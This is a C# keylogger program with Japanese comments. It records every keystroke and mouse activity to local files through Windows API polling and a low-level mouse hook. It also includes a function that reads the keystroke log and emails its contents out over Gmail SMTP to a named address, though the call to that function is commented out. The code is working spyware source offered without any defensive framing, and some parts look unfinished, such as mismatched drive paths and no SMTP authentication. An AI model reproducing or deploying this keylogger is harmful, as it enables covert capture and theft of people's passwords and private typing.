using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KeyLogger3
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        [DllImport("User32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        // 打鍵カウンタ
        static long numberOfKeyStrokes = 0;

        static void Main(string[] args)
        {
            // ファイル出力パス
            String filePath = Environment.CurrentDirectory = @"C:\keylogger\output";
            String path1 = (filePath + @"\keystrokes.txt");
            String path2 = (filePath + @"\mousehook.txt");

            StringBuilder sb = new StringBuilder();

            // フォルダが存在しなければ作成
            if (!Directory.Exists(filePath))
            {
                Directory.CreateDirectory(filePath);
            }
            // ファイルが存在しなければ作成
            if (!File.Exists(path1))
            {
                using (StreamWriter sw = File.CreateText(path1))
                {
                    File.CreateText(path1);
                }
            }
            if (!File.Exists(path2))
            {
                using (StreamWriter sw = File.CreateText(path2))
                {
                    File.CreateText(path2);
                }
            }

            // 無限ループ
            while (true)
            {
                ArtMouseHook oMouseHook = ArtMouseHook.GetInstance();
                oMouseHook.StartMouseEvent(MouseEvent);
                void MouseEvent(int iX, int iY)
                {
                    Console.Write("x=" + iX + "   y=" + iY);
                }

                // pause and let other programs get a chance to run
                Thread.Sleep(5);

                // キーボード監視
                // check all keys for their state
                for (int i = 1; i < 256; i++)
                {
                    int KeyState = GetAsyncKeyState(i);

                    // print to the console
                    if ((KeyState & 1) != 0)
                    {
                        Console.Write((char)i + ", ");

                        // 打鍵キーをファイル出力
                        using(StreamWriter sw = File.AppendText(path1))
                        {
                            sw.Write((char)i);
                        }
                        numberOfKeyStrokes++;

                        // 100文字以上タイピングでデータ送信
                        if (numberOfKeyStrokes % 100 == 0)
                        {
                            // SendNewMessage();
                            System.Diagnostics.Process.Start("http://google.com");
                            // カウントリセット
                            numberOfKeyStrokes = 0;
                        }
                    }
                }

                // マウス監視
                LASTINPUTINFO lastInPut = new LASTINPUTINFO();
                lastInPut.cbSize = (uint)Marshal.SizeOf(lastInPut);
                lastInPut.dwTime = 0;
                int systemUptime = Environment.TickCount;
                int idleTicks = 0;

                if (GetLastInputInfo(ref lastInPut))
                {
                    int lastInputTicks = (int)lastInPut.dwTime;
                    idleTicks = systemUptime - lastInputTicks;

                    // アイドルタイムをファイル出力
                    using (StreamWriter sw = File.AppendText(path2))
                    {
                        sb.Append("現在時刻：");
                        sb.Append(DateTime.Now);
                        sb.Append(Environment.NewLine);
                        sb.Append("アイドルタイム：");
                        sb.Append(idleTicks / 1000 + "秒");
                        sb.Append(Environment.NewLine);
                        sw.Write(sb.ToString());
                        sb.Clear();
                    }
                }

            }

        } // main

        // マウス監視
        public class ArtMouseHook
        {
            //構造定義
            public enum Stroke
            {
                MOVE,
                LEFT_DOWN,
                LEFT_UP,
                RIGHT_DOWN,
                RIGHT_UP,
                MIDDLE_DOWN,
                MIDDLE_UP,
                WHEEL_DOWN,
                WHEEL_UP,
                X1_DOWN,
                X1_UP,
                X2_DOWN,
                X2_UP,
                UNKNOWN
            }

            public struct StateMouse
            {
                public Stroke Stroke;
                public int X;
                public int Y;
                public uint Data;
                public uint Flags;
                public uint Time;
                public IntPtr ExtraInfo;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct POINT
            {
                public int x;
                public int y;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct MSLLHOOKSTRUCT
            {
                public POINT pt;
                public uint mouseData;
                public uint flags;
                public uint time;
                public System.IntPtr dwExtraInfo;
            }

            //関数定義
            [DllImport("user32.dll")]
            private static extern IntPtr SetWindowsHookEx(
                int idHook,
                MouseHookCallback lpfn,
                IntPtr hMod,
                uint dwThreadId);

            [DllImport("user32.dll")]
            private static extern IntPtr CallNextHookEx(
                IntPtr hhk,
                int nCode,
                uint msg,
                ref MSLLHOOKSTRUCT msllhookstruct);

            private delegate IntPtr MouseHookCallback(int nCode, uint msg, ref MSLLHOOKSTRUCT msllhookstruct);

            //マウスイベント
            private event MouseHookCallback m_EventMouse;
            private IntPtr m_Handle;

            private IntPtr EventMouse(int nCode, uint msg, ref MSLLHOOKSTRUCT s) //MouseHookCallback
            {
                int iX = s.pt.x;
                int iY = s.pt.y;
                m_MouseEventDelegate(iX, iY);
                return (IntPtr)0;
                // return CallNextHookEx(m_Handle, nCode, msg, ref s);
            }

            //-------------------------------------
            //-------------------------------------
            //-------------------------------------

            //インスタンスの取得
            private static ArtMouseHook m_Instance = null;

            public static ArtMouseHook GetInstance()
            {
                if (m_Instance == null)
                {
                    m_Instance = new ArtMouseHook();
                }

                return m_Instance;
            }

            //マウスイベントの開始
            public delegate void MouseEventDelegate(int iX, int iY);
            private MouseEventDelegate m_MouseEventDelegate = null;

            public void StartMouseEvent(MouseEventDelegate oMouseEventDelegate)
            {
                IntPtr hInstance = Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly().GetModules()[0]);

                // WH_MOUSE_LL = 14
                m_MouseEventDelegate = oMouseEventDelegate;
                m_EventMouse = EventMouse;
                m_Handle = SetWindowsHookEx(14, m_EventMouse, hInstance, 0);

                if (m_Handle == IntPtr.Zero)
                {
                    //Console.WriteLine("ERROR ArtMouseHook");
                }
            }
        }

        // 構造体定義
        internal struct LASTINPUTINFO
        {
            public uint cbSize;

            public uint dwTime;
        }

        static void SendNewMessage()
        {
            // send the contents of the text file to an external email address
            String folderName = Environment.CurrentDirectory = @"D:\keylogger\output";
            string filePath = folderName + @"\keystrokes.txt";

            String logContents = File.ReadAllText(filePath);
            String subject = "Message from keylogger";

            using (var smtp = new MailKit.Net.Smtp.SmtpClient())
            {
                try
                {
                    // メールサーバ接続情報 
                    string strHost = "smtp.gmail.com";
                    int nPort = 587;
                    MailKit.Security.SecureSocketOptions mailSecOpt = MailKit.Security.SecureSocketOptions.Auto;
                    string strUsrAddr = "k.shimazaki@wiz-net.jp";

                    // SMTPサーバに接続
                    smtp.Connect(strHost, nPort, mailSecOpt);
                    // 送信するメールを作成
                    MimeKit.MimeMessage mail = new MimeKit.MimeMessage();
                    MimeKit.BodyBuilder builder = new MimeKit.BodyBuilder();
                    mail.From.Add(new MimeKit.MailboxAddress("", strUsrAddr));
                    mail.To.Add(new MimeKit.MailboxAddress("", strUsrAddr));
                    mail.Subject = subject;
                    builder.TextBody = logContents;
                    mail.Body = builder.ToMessageBody();
                    // メールを送信
                    smtp.Send(mail);
                }
                catch(Exception exception)
                {
                    Console.WriteLine(exception.Message);
                }
                finally
                {
                    //SMTPサーバから切断する
                    smtp.Disconnect(true);
                }
            }

        }
    }
}
